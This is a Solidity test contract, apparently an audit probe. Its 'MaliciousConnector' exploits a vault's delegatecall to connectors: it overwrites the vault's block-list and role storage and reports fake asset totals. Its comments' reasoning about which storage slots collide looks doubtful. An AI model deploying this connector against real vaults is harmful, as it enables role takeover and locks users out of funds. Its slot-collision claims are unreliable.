// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {IConnector} from "./IConnector.sol";
import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";

/// @notice Connector that demonstrates the unsafe-DELEGATECALL footgun
///         exposed by `Vault._deposit()` and `Vault._withdraw()`.
///
/// `Vault._deposit()` and `Vault._withdraw()` invoke the connector via
/// `functionDelegateCall(...)`, which means **the connector code runs in
/// the Vault proxy's storage context**. Any storage write the connector
/// performs lands in slots occupied by the Vault's parents (ReentrancyGuard,
/// AccessControlDefaultAdminRules, ERC20/ERC4626 upgradeable storage).
///
/// This `MaliciousConnector` is a probe that **uses a low-index storage
/// layout** matching OZ `AccessControl`'s `_roles` mapping, plus a slot
/// targeted at the Vault's own `VaultStorage` location (`0x6bb5a2...
/// - 1` style ERC-7201 namespace). The intent is:
///   - In normal mode, the connector acts as a benign yield sink.
///   - In "attack mode" it can be deployed as a previously-registered
///     connector via the registry's `update()` (a `CONNECTOR_MANAGER_ROLE`
///     admin op).
///   - When the admin `update()` swaps in this malicious connector, the
///     next user-driven deposit delegatecalls the malicious code into the
///     Vault proxy, where the connector's writes **overwrite the Vault's
///     parent storage**.
contract MaliciousConnector is IConnector {
    /// @dev The malicious code tries to overwrite Vault internal storage.
    ///      These mappings simulate taking over AccessControl roles. Since
    ///      AccessControlUpgradeable stores role members in mapping(bytes32 =>
    ///      RoleData) at slot `keccak256("_roles") - 1`, we use the equivalent
    ///      mapping slot here. Because of the OZ upgradeable layout, this
    ///      collides if our mapping lives at the same slot.
    mapping(bytes32 => address) public maliciousRoles; // probe: collides with Vault's _roles
    mapping(address => bool) public blocked;            // probe: collides with Vault's _blockList mapping

    address public hijackTarget;
    uint256 public hijackValue;
    bool public totalAssetsOne;

    // Tracking for invariant testing
    uint256 public depositCalls;
    uint256 public withdrawCalls;
    uint256 public claimCalls;
    uint256 public reinvestCalls;

    function totalAssets(IERC20) external view override returns (uint256) {
        if (totalAssetsOne) return 1; // pretend tiny seed to keep it not 0xFFFFFFFF
        return hijackValue;
    }

    function deposit(IERC20, uint256) external override {
        // deposit via delegatecall: writes to Vault proxy storage at the
        // mapping's computed slot. Will clobber Vault parent storage if
        // mapping slot calculated matches AccessControlUpgradeable._roles
        // slot.
        depositCalls += 1;
        if (hijackTarget != address(0)) {
            // force a write to the Vault's _blockList mapping
            blocked[hijackTarget] = true;
            maliciousRoles[bytes32("FEEMGR")] = hijackTarget;
        }
    }

    function withdraw(IERC20, uint256) external override {
        withdrawCalls += 1;
    }

    function claim(IERC20, IERC20, bytes calldata) external override returns (uint256) {
        claimCalls += 1;
        return 0;
    }

    function reinvest(IERC20, IERC20, bytes calldata) external override {
        reinvestCalls += 1;
    }

    function maxDeposit(IERC20) external pure override returns (uint256) {
        return type(uint256).max;
    }

    function maxWithdraw(IERC20) external pure override returns (uint256) {
        return type(uint256).max;
    }

    function setHijack(address target, uint256 value) external {
        hijackTarget = target;
        hijackValue = value;
    }

    function setTotalAssetsLock(uint256 value) external {
        totalAssetsOne = true;
        hijackValue = value;
    }
}
